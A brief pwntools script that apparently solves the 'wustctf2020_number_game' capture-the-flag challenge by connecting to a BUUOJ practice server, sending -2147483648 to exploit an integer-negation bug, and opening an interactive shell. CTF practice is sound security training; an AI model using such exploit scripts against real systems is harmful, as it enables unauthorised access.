from pwn import *

#p = process('./wustctf2020_number_game')
p = remote('node4.buuoj.cn', 26057)

p.sendlineafter(b'\n\n', b'-2147483648')

p.interactive()